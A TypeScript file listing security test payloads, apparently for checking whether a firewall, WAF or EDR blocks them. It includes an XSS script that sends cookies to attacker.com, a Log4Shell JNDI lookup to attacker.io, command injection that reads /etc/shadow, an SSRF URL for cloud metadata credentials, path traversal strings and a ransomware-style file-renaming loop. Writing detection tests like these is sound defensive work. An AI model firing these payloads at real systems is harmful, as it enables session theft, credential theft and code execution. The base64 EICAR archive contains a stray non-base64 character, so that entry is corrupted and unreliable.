
import { TestPayload, TestCategory } from './types';

export const TEST_PAYLOADS: TestPayload[] = [
  // --- WAF / WEB APP ATTACKS ---
  {
    id: 'waf-sqli-01',
    name: 'SQLi: Tautology Bypass',
    description: 'Basic auth bypass attempt using standard SQL tautology.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "' OR 1=1 --",
    expectedBehavior: '403 Forbidden or 406 Not Acceptable'
  },
  {
    id: 'waf-xss-01',
    name: 'XSS: Stored Script Injection',
    description: 'Simulates injecting a malicious script tag to steal sessions.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "<script>alert('XSS_SUCCESS');document.location='http://attacker.com/steal?c='+document.cookie</script>",
    expectedBehavior: 'WAF Cross-Site Scripting Filter'
  },
  {
    id: 'waf-lfi-01',
    name: 'LFI: Path Traversal',
    description: 'Attempts to read system files via relative path traversal.',
    category: TestCategory.WAF,
    type: 'network',
    targetDevice: 'NGFW',
    content: "../../../../../../../../etc/passwd",
    expectedBehavior: 'Directory Traversal Protection'
  },

  // --- IPS / INFRASTRUCTURE ---
  {
    id: 'ips-rce-01',
    name: 'RCE: OS Command Injection',
    description: 'Attempts to execute shell commands via application parameters.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "; cat /etc/shadow; id; uname -a",
    expectedBehavior: 'OS Command Injection Signature'
  },
  {
    id: 'ips-ssrf-01',
    name: 'SSRF: Cloud Metadata Leak',
    description: 'Attempts to access internal AWS/GCP metadata service from the public web.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    expectedBehavior: 'SSRF / Internal Network Access Control'
  },
  {
    id: 'ips-log4shell',
    name: 'RCE: Log4Shell (CVE-2021-44228)',
    description: 'Simulates the JNDI lookup exploit pattern.',
    category: TestCategory.IPS,
    type: 'network',
    targetDevice: 'NGFW',
    content: "${jndi:ldap://attacker.io/a}",
    expectedBehavior: 'Log4J Signature Match'
  },

  // --- API SECURITY ---
  {
    id: 'api-jwt-01',
    name: 'API: JWT None Algorithm',
    description: 'Attempts to bypass API authentication using the "none" algorithm vulnerability.',
    category: TestCategory.API,
    type: 'network',
    targetDevice: 'NGFW',
    content: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiaW52YWxpZCJ9.",
    expectedBehavior: 'API Protocol Validation'
  },
  {
    id: 'api-bolp-01',
    name: 'API: Mass Assignment',
    description: 'Attempts to escalate privileges by injecting hidden JSON fields.',
    category: TestCategory.API,
    type: 'network',
    targetDevice: 'NGFW',
    content: '{"user_id": 123, "is_admin": true, "role": "superuser"}',
    expectedBehavior: 'API Schema Validation'
  },

  // --- EVASION TECHNIQUES ---
  {
    id: 'evasion-hex-01',
    name: 'Evasion: Hex Encoded SQLi',
    description: 'Encoded version of SQLi to bypass simple string match signatures.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "0x27204F5220313D31",
    expectedBehavior: 'Protocol Decoding & Deep Inspection'
  },
  {
    id: 'evasion-null-01',
    name: 'Evasion: Null Byte Injection',
    description: 'Attempts to terminate string checks using %00 characters.',
    category: TestCategory.EVASION,
    type: 'network',
    targetDevice: 'NGFW',
    content: "/etc/passwd%00.jpg",
    expectedBehavior: 'Input Sanitization Validation'
  },

  // --- VIRUS / MALWARE ---
  {
    id: 'virus-eicar-zip',
    name: 'Virus: Compressed EICAR',
    description: 'EICAR test string inside a ZIP archive. Tests NGFW "Recursive Archive Scanning".',
    category: TestCategory.VIRUS,
    type: 'download',
    targetDevice: 'BOTH',
    content: 'UEsDBAoAAAAAAOCvVlUAAAAAAAAAAAAAAAAIABAAWGVpY2FyLnR4dFVUCQADuX1vXrl9b111eAsAAQT1AQAABBQAAABYNVkhVUAleDRQWlg1NChQXmls3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSStIKlBLAwQKAAAAAADgr1ZVAAAAAAAAAAAAAAAAEAAQAF9fTUFDT1NYL1VUCQADuX1vXrl9b111eAsAAQT1AQAABBQAAABQSwMEFAAIAAgA4K9WVQAAAAAAAAAAAAAAAAsAEABfX01BQ09TWC8uX2VpY2FyLnR4dFVUCQADuX1vXrl9b111eAsAAQT1AQAABBQAAABjYBKm4mCwYJBgsGIKAbIMDAz8DExuKUlFxZn5eXpFCkrGZvpGBiYGRgZGxgYgNqK8iX6ugYGRkaGhgaGBoREIAwA1DAtQSwECFwsAAgAAAAAA4K9WVQAAAAAAAAAAAAAAAAgAGAAAAAAAAAAAAAAAAP0BAABlaWNhci50eHRVVAUAA7l9b111eAsAAQT1AQAABBQAAABQSwECFwsAAgAAAAAA4K9WVQAAAAAAAAAAAAAAAAAQABAAAAAAAAAAAAAAAAD9AgAAX19NQU堅RYL1VUBQADuX1vX11eAsAAQT1AQAABBQAAABQSwECFwsAAQACAAgA4K9WVQAAAAAAAAAAAAAAAAsAGAAAAAAAAAAAAAAAAP0DAABfX01BQ09TWC8uX2VpY2FyLnR4dFVUBQADuX1vX11eAsAAQT1AQAABBQAAABQSwUGAAAAAAMAAwDFAAAA2wQAAAAA',
    expectedBehavior: 'Blocked by NGFW Gateway AV'
  },

  // --- RANSOMWARE ---
  {
    id: 'ransom-sim-01',
    name: 'Ransomware: File Mass-Rename',
    description: 'Simulates the rapid renaming of files to a ".locked" extension.',
    category: TestCategory.RANSOMWARE,
    type: 'script',
    targetDevice: 'EDR',
    content: 'for ($i=1; $i -le 100; $i++) { New-Item -Path "C:\\Temp\\test$i.txt" -ItemType File; Rename-Item -Path "C:\\Temp\\test$i.txt" -NewName "test$i.txt.locked" }',
    expectedBehavior: 'EDR Anti-Ransomware Behavioral Block'
  }
];
